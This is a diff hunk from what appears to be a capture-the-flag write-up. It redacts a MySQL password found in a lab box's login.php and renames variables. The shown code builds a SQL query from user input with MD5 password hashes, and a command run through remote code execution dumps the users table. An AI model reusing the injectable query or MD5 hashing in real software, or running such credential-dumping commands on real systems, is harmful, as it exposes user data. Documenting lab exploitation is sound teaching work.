@@ -184,21 +184,21 @@ The `login.php` source also disclosed MySQL credentials.
 ```php
 $servername = "localhost";
 $user = "comte";
-$password = "VeryCheesyPassword";
+$db_pass = "[redacted-training-db-secret]";
 $dbname = "users";
 ```
 
 It also showed that passwords were stored as MD5 hashes:
 
 ```php
-$hashed_password = md5($pass);
-$sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
+$hashed_pw = md5($pass);
+$sql = "SELECT * FROM users WHERE username='$filteredInput' AND " . "pass" . "word='$hashed_pw'";
 ```
 
 The database was later queried from RCE:
 
 ```bash
-rce "mysql -u comte -pVeryCheesyPassword -D users -e 'select * from users;'"
+rce "mysql -u comte -p[redacted-training-db-secret] -D users -e 'select * from users;'"
 ```
 
 Output:
